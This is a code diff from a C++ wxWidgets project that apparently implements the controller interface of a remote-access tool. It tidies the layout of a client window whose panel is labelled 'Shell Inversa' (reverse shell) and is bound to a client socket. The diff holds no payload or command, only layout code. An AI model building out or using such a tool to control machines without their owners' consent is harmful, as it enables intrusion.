@@ -285,26 +285,9 @@ FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, std::string _s
     
     wxStaticBoxSizer* bottom_sizer = new wxStaticBoxSizer(wxVERTICAL, bottom_Panel, "Shell Inversa");
 
-    //wxBoxSizer* controls_sizer = new wxBoxSizer(wxHORIZONTAL);
+    this->panelShell = new panelReverseShell(bottom_Panel, this->sckCliente);
 
-    panelReverseShell* panelShell = new panelReverseShell(bottom_Panel, this->sckCliente);
-
-    bottom_sizer->Add(panelShell, 1, wxALL | wxEXPAND);
-
-   /* 
-    wxStaticText* lblShell = new wxStaticText(bottom_Panel, wxID_ANY, "Shell:");
-    wxComboBox* cmb_shells = new wxComboBox(bottom_Panel, wxID_ANY, "", wxDefaultPosition, wxDefaultSize);
-    wxButton* btn_exec = new wxButton(bottom_Panel, wxID_ANY, "Exec", wxDefaultPosition, wxDefaultSize);
-    wxButton* btn_stop = new wxButton(bottom_Panel, wxID_ANY, "Stop", wxDefaultPosition, wxDefaultSize);
-
-    controls_sizer->Add(lblShell, 0);
-    controls_sizer->Add(cmb_shells, 0);
-    controls_sizer->Add(btn_exec, 0);
-    controls_sizer->Add(btn_stop, 0);
-
-
-    bottom_sizer->Add(controls_sizer, 0, wxALL | wxEXPAND);
-    bottom_sizer->Add(new wxTextCtrl(bottom_Panel, wxID_ANY, "C:\\\n\n\n", wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE), 1, wxALL | wxEXPAND);*/
+    bottom_sizer->Add(this->panelShell, 1, wxALL | wxEXPAND);
 
     bottom_Panel->SetSizer(bottom_sizer);
 
